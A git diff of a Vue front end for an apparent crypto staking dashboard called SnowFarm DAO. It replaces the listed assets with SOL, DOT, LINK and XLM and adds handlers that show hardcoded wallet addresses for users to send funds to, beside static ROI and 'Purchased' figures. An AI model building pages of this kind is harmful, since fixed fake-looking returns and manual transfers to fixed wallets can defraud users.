@@ -1,11 +1,14 @@
 <template>
   <div>
     <div class="div1">
-      <a href="https://snowtrace.io/address/0xa3Aa335f1B9Ad61fc5Ce5485E5cCC547FB86cFb3"><img src="../assets/namedash.png" alt="" width="100%" style="margin-top:10%"></a>
+      <a href="https://snowtrace.io/address/0xa3Aa335f1B9Ad61fc5Ce5485E5cCC547FB86cFb3"><img src="../assets/namedash1.png" alt="" width="100%" style="margin-top:10%"></a>
       <img src="../assets/dashdash.png" alt="" width="100%" style="margin-top:20%;cursor: pointer;" v-on:click="dash">
       <img src="../assets/dash.png" alt="" width="100%" style="margin-top:10%;cursor: pointer;" v-on:click="stake">
       <img src="../assets/dashboard1.png" alt="" width="100%" style="cursor: pointer;" v-on:click="mintf" >
-      <img src="../assets/dashboard2.png" alt="" width="100%" style="margin-top:20%">
+      <img src="../assets/dashboard2.png" alt="" width="100%" style="margin-top:10%">
+      <img src="../assets/twitter.png" alt="" width="50%" style="margin-top:10%">
+      <a href="https://discord.gg/MJ8hhYQxtK"><img src="../assets/discord.png" alt="" width="25%" style="margin-top:10%;cursor:pointer" > </a>
+     <a href="https://magicrabit23.gitbook.io/snowfarm-dao-whitepaper/"><img src="../assets/white.png" alt="" width="25%" style="margin-top:10%; cursor:pointer" height="20%"></a> 
       <!-- <img src="../assets/dashboard2.png" alt="" width="100%" height="50%"> -->
     </div>
     <div class="div2">
@@ -40,7 +43,7 @@
       <button style="margin-top:100px;padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px" v-on:click="buy"> Buy Now</button>
       </div>
       <div class="center" v-if="show3">
-        <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Transfer the amount to following address:</h2>
+        <h2 style="font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; "> Transfer the desired staked currency to following address:</h2>
         <span style="margin-top:100px;width:300px; background-color:black; border:3px solid white; height:24px; padding:12px; color:white; margin-top:30px">{{this.address}}</span>
         <h3 style="margin-top:100px;font-family: Montserrat Medium; color:#fff;font-size: 24px; font-weight:800; padding:10px; ">Waiting for payment...</h3>
         <button style="margin-top:100px;padding: 12px 48px; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; width:200px; margin-bottom:50px" v-on:click="back2">Back</button>
@@ -89,37 +92,37 @@
        <table style="margin-top:100px; margin-left:50px">
   <tr style="margin-top:100px; height:60px">
     <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:200px; height:100px">Mint</th>
-    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; width:120px">Price</th>
-    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:120px">Roi</th>
-     <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:120px">Purchased</th>
+    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; width:150px">Price</th>
+    <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:150px">Roi</th>
+     <th style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;width:150px">Purchased</th>
   </tr>
   <tr style="margin-top:100px; height:60px">
-    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">SB-MIM LP</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">SOl</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3226.64</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">6.24%</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$29,013,465</td>
-    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="stake">Mint</button></td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="sol">Mint</button></td>
   </tr>
  <tr style="margin-top:100px; height:60px">
-    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">SB-AVAX Lp   View Contract</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">DOT</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$2882.65</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">7.14%</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$17,754,793</td>
-    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="stake">Mint</button></td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="dot">Mint</button></td>
   </tr>
   <tr style="margin-top:100px; height:60px">
-    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">wAVaX</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">LINK(ETH)</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3048.44</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">1.31%</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$21,441,317</td>
-    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="stake">Mint</button></td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806;" v-on:click="link">Mint</button></td>
   </tr>
   <tr style="margin-top:100px; height:60px">
-    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">MIM</td>
+    <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">XLM</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat;">$3056.08</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">1.06%</td>
     <td style="color: white;font-size: 18px;font-weight: 400;font-family: Montserrat; widht:300px; margin-left:300px">$20,502,533</td>
-    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; " v-on:click="stake">Mint</button></td>
+    <td><button style=" padding: 12px 48px;background-color:#c3f53c; box-shadow: 0 0 10px rgb(44 39 109 / 10%); border-radius:4px; cursor: pointer; border: 1px solid #0f5806; " v-on:click="xlm">Mint</button></td>
   </tr>
 </table>
       </div>
@@ -144,6 +147,31 @@ export default {
     }
   },
   methods:{
+    link(){
+      this.currency="LINK"
+      this.func="link"
+      this.show2=true;
+      this.mint=false
+    },
+    xlm(){
+      this.currency="XLM"
+      this.func="xlm"
+      this.show2=true;
+      this.mint=false
+    },
+    dot(){
+      this.currency="DOT"
+      this.func="dot"
+      this.show2=true;
+      this.mint=false
+
+    },
+    sol(){
+      this.currency="SOL"
+      this.func="sol"
+      this.show2=true;
+      this.mint=false
+    },
     mintf(){
       this.mint=true
       this.show1=false;
@@ -198,6 +226,26 @@ this.show1=false;
       this.func='teth'
        this.currency='USDT'
     },buy(){
+      if (this.func=="sol") {
+        this.show3=true;
+        this.show2=false;
+        this.address='FmAJY1rLGVNmcqzVU2DZn1jPiiNT9DwWjMHxiVLPKpEo'
+      }
+      if (this.func=="dot") {
+        this.show3=true;
+        this.show2=false;
+        this.address='167dMS5ND4A7SyDBNeF9TvzZ5Pz2rVZ7cUn7yGsCvvai8UrW'
+      }
+      if (this.func=="link") {
+        this.show3=true;
+        this.show2=false;
+        this.address='0xe71A09cF81FD0F8AD95717702EeFDA229175BD65'
+      }
+      if (this.func=="xlm") {
+        this.show3=true;
+        this.show2=false;
+        this.address='GADAZDAHDOCWQONFDSLCLKTEO66KITO3LQ4TZTSM6UDRBSXUSTYS5L4T'
+      }
       if (this.func=="teth") {
         this.show3=true;
         this.show2=false;
@@ -278,7 +326,7 @@ this.show1=false;
   float: left;
   width: 20%;
   //height:100%;
-  background-color: rgb(32, 52, 117);
+  background-color: rgba(30,54,112,255);
   backdrop-filter: blur(100px);
 }
 .div2{
